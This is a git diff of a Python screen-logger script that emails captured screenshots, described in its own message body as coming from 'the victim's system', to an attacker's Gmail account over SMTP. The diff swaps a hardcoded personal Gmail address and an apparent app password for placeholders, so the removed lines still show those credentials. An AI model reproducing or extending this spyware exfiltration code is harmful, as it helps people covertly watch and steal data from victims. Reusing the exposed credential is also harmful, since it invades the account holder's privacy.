@@ -8,8 +8,8 @@ from email.message import EmailMessage
 def send_mail():
     try:
         msg = EmailMessage()
-        msg["From"] = "sahiljamadar16@gmail.com"
-        msg["To"] = "sahiljamadar16@gmail.com"
+        msg["From"] = " "   # Here goes your mail.
+        msg["To"] = " "     # Here goes your mail.
         msg["Subject"] = "PYTHON's Screen logger captured screenshots"
         
         body="Screen Shots from the victim's system"
@@ -28,7 +28,7 @@ def send_mail():
         server = smtplib.SMTP("smtp.gmail.com",587)
         server.ehlo()
         server.starttls()
-        server.login("sahiljamadar16@gmail.com","ylcswgzdpiojzgoo")
+        server.login("your_mail_id","password")   # Here goes your mail id and password.
         server.send_message(msg)
 
         server.close()
